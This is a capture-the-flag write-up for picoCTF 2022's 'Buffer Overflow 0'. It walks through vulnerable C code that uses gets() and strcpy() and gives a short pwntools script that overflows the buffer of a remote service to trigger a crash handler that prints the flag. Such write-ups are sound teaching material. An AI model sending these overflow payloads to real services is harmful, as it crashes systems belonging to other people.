
# Challenge Write-Up — Buffer Overflow 0

---

## 📌 Challenge Overview

| Field           | Information                                                                              |
| :-------------- | :--------------------------------------------------------------------------------------- |
| **Competition** | picoCTF 2022                                                                             |
| **Category**    | Binary Exploitation                                                                      |
| **Difficulty**  | Medium                                                                                   |
| **Objective**   | Overflow a buffer to trigger a segmentation fault, which activates a signal handler that prints the flag |

---

## Initial Analysis

I was given a binary and its source code. Unlike Buffer Overflow 1, this challenge does not require us to redirect execution to a specific function by controlling the return address precisely. Instead, the goal is simpler: just crash the program in the right way.

The program has a signal handler called `sigsegv_handler` that fires whenever a segmentation fault occurs. That handler is the one that reads and prints the flag. So all we need to do is cause a crash.

My plan:
- Read the source code to find the unsafe functions
- Understand why a crash triggers the flag
- Send more input than the buffer can hold to cause the overflow
- Collect the flag from the signal handler output

---

## 🔎 Step 1 — Read the Source Code

The source code had two functions worth paying attention to.

The `main` function read user input using `gets()` into a 100-byte buffer, then passed it to `vuln()`. The `vuln()` function then copied that input into a much smaller 16-byte buffer using `strcpy()`:

```c
void vuln(char *input) {
    char buf[16];
    strcpy(buf, input);  // no size check
}

int main() {
    char input[100];
    gets(input);         // no size check
    vuln(input);
}
```

Both `gets()` and `strcpy()` have no size checks. The real danger here is `strcpy()` — it copies into a 16-byte buffer whatever we pass it, no matter how long.

There was also a third function registered as a signal handler:

```c
void sigsegv_handler(int sig) {
    // reads and prints flag.txt
}
```

Whenever the program crashes with a segmentation fault, the OS sends the `SIGSEGV` signal to the process. Because `sigsegv_handler` was registered to handle that signal, it runs automatically on any crash and prints the flag.

---

## Step 2 — Understand Why This Works

When we overflow the 16-byte `buf` inside `vuln()`, the extra bytes spill past the buffer and start corrupting other things on the stack — including the return address. When `vuln()` tries to return, it reads a garbage value and tries to jump to a random address, which immediately causes a segmentation fault.

The OS catches the fault, the signal handler fires, and the flag gets printed. We do not need to control exactly where the program jumps. We just need it to crash.

---

## Step 3 — Send the Payload

Any input longer than 16 bytes would be enough to overflow `buf`, but to be safe I used `pwntools`' `cyclic()` function to generate a 200-byte pattern. That is well past the 16-byte limit and guaranteed to cause a crash.

```python
#!/usr/bin/env python3

from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY)

LOCAL = False
if LOCAL:
    p = process(BINARY)
else:
    host = input("Host: ")
    port = int(input("Port: "))
    p = remote(host, port)

print(p.recvuntil(b": ").decode())

payload = cyclic(200)
p.sendline(payload)

response = p.recvall().decode()
print(f"[!] Flag found: {response}")
```

The 200-byte input overflowed `buf`, crashed the program, fired `sigsegv_handler`, and the flag printed in the response. ✅

---

## 🏁 Flag

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

---

## 🔬 What Made This Work

This challenge used a clever design: instead of hiding the flag behind a function we need to precisely jump to, it hid the flag inside a crash handler. That removed the need for any offset calculation or address finding. We just needed the program to segfault.

The two unsafe functions that made this possible:
- `gets()` reads unlimited input with no size limit
- `strcpy()` copies it into a 16-byte buffer with no size limit

The key difference from Buffer Overflow 1: there, we needed to control exactly where the program jumped after the crash. Here, we only needed the crash itself. The signal handler took care of the rest automatically.

---

## 🎯 How to Solve Challenges Like This

1. Read the source code and look for signal handlers — `SIGSEGV`, `SIGABRT`, etc.
2. If the handler prints the flag, your only job is to trigger that signal
3. Find any unsafe input call (`gets`, `strcpy`, `scanf("%s", ...)`) that writes into a small buffer
4. Send more input than the buffer can hold — any amount well over the buffer size works
5. Read the output and collect the flag from the handler

---

## 🧩 Final Thoughts

Buffer Overflow 0 is a great entry point into the buffer overflow series. It shows that overflow bugs do not always need a precise, surgical payload to be exploitable. Sometimes just causing a crash is enough — especially when the program has been written in a way that does something useful on crash.

The fix would be to replace `gets()` with `fgets()` and `strcpy()` with `strncpy()`, both of which accept a maximum length argument. Either change would have prevented the input from ever reaching past the buffer boundary.

---
